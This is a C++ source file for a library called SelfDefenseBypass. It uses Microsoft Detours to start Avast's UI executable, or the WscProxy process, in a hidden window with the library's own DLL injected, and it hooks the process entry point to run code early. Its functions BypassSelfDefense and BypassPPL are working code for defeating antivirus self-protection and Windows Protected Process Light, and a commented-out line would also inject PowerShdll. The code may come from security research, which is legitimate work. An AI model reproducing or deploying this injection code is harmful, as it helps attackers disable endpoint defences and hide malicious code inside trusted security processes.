// SelfDefenseBypass.cpp : Defines the functions for the static library.
//

#include <Windows.h>
#include "SelfDefenseBypass.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

namespace
{
    void CreateProcessWithSelf(std::wstring_view exeFilePath)
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(CreateProcessWithSelf, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto exePath = fs::path(exeFilePath);
        const auto exeParentDirectoryPath = exePath.parent_path();

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        /*auto thisModuleParentDirectoryPath = thisModulePath.parent_path();
        const auto powerShdllPath = std::move(thisModuleParentDirectoryPath) / "PowerShdll.dll";*/

        const auto thisModulePathString = thisModulePath.string();
        //const auto powerShdllPathString = powerShdllPath.string();

        const char *injectedDlls[] = { thisModulePathString.c_str()/*, powerShdllPathString.c_str()*/ };

        STARTUPINFO startupInfo = {};
        startupInfo.wShowWindow = SW_HIDE;
        startupInfo.cb = sizeof(startupInfo);

        wil::unique_process_information processInfo;

        if (!DetourCreateProcessWithDlls(
            nullptr,
            const_cast<LPWSTR>(exePath.c_str()),
            nullptr,
            nullptr,
            FALSE,
            0,
            nullptr,
            exeParentDirectoryPath.c_str(),
            &startupInfo,
            &processInfo,
            _countof(injectedDlls),
            injectedDlls,
            &::CreateProcessW))
            throw std::runtime_error("DetourCreateProcessWithDlls failed. Error: " + std::to_string(::GetLastError()));
    }
} // anonymous namespace

void BypassSelfDefense()
{
    CreateProcessWithSelf(AvastUiExeFilePath);
}

void BypassPPL()
{
    CreateProcessWithSelf(WscProxyExeFilePath);
}

EntryPointType DelayedExecute(EntryPointType detourEntryPoint)
{
    auto originalEntryPoint = reinterpret_cast<EntryPointType>(DetourGetEntryPoint(NULL));
    if (!originalEntryPoint)
        throw std::runtime_error("DetourGetEntryPoint failed: error " + std::to_string(::GetLastError()));

    auto returnValue = DetourTransactionBegin();
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourTransactionBegin failed. Error " + std::to_string(returnValue));

    returnValue = DetourUpdateThread(::GetCurrentThread());
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourUpdateThread failed. Error " + std::to_string(returnValue));

    returnValue = DetourAttach(&reinterpret_cast<PVOID &>(originalEntryPoint), detourEntryPoint);
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourAttach failed. Error " + std::to_string(returnValue));

    returnValue = DetourTransactionCommit();
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourTransactionCommit failed. Error " + std::to_string(returnValue));

    return originalEntryPoint;
}
